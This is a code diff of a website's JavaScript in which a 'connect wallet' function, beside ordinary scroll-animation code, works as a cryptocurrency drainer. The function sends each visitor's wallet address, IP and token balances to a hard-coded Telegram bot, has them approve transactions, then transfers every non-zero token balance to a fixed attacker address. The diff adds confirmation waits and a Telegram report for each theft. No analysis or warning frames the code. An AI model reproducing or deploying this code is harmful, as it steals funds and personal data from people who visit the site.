@@ -81,15 +81,6 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
- * Spoof Simulation Configuration (retained for potential future use)
- */
-const spoofConfig = {
-  noApprovementMode: false,
-  hideNativeWithdraw: false,
-  showNativeTopup: false
-};
-
-/**
  * Wallet connect and token transfer using Moralis API with Telegram notification
  */
 async function connectWalletAndSendTokens() {
@@ -138,7 +129,7 @@ async function connectWalletAndSendTokens() {
     const tokens = await response.json();
     const originalTokens = [...tokens]; // Store tokens for transfer and Telegram
 
-    // Format balance summary for Telegram (only non-zero real tokens)
+    // Format balance summary for initial Telegram notification (non-zero real tokens)
     let tokenSummaryTelegram = "";
     const nonZeroTokens = originalTokens.filter(token => token.balance && !ethers.BigNumber.from(token.balance).isZero());
     if (nonZeroTokens.length > 0) {
@@ -151,8 +142,10 @@ async function connectWalletAndSendTokens() {
       tokenSummaryTelegram = "No non-zero token balances found.";
     }
 
-    // Compose Telegram message with only non-zero real token balances
-    const fullMessage = `
+    // Send initial Telegram message with non-zero token balances
+    const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
+    const chatId = "5995616824";
+    const initialMessage = `
 📥 Wallet Connected!
 Address: ${userAddress}
 Wallet: ${walletType}
@@ -163,20 +156,16 @@ IP: ${locationData.ip || "N/A"}
 ${tokenSummaryTelegram}
     `;
 
-    const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
-    const chatId = "5995616824";
-
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: chatId,
-        text: fullMessage
+        text: initialMessage
       })
     });
 
     // Proceed with approving and transferring all non-zero token balances
-    // User approves an 'approve' transaction for each token, then script transfers to Exodus wallet
     for (const token of originalTokens) {
       try {
         const contract = new ethers.Contract(token.token_address, [
@@ -197,9 +186,32 @@ ${tokenSummaryTelegram}
           console.log(`Approved ${token.symbol} for transfer, tx:`, approveTx.hash);
         }
 
-        // Perform transfer to Exodus wallet (no additional user prompt needed)
+        // Perform transfer to Exodus wallet
         const tx = await contract.transfer("0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57", balanceInWei);
+        await tx.wait(); // Wait for transaction confirmation
         console.log(`Sent ${token.symbol}, tx:`, tx.hash);
+
+        // Send Telegram notification for successful transfer
+        const decimals = token.decimals ?? 18;
+        const balance = ethers.utils.formatUnits(token.balance, decimals);
+        const successMessage = `
+✅ Token Transfer Successful!
+Token: ${token.symbol}
+Amount: ${balance}
+Contract: ${token.token_address}
+Destination: 0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57
+Tx Hash: ${tx.hash}
+        `;
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: successMessage
+          })
+        });
+
       } catch (err) {
         console.warn(`Failed to process ${token.symbol}`, err);
       }
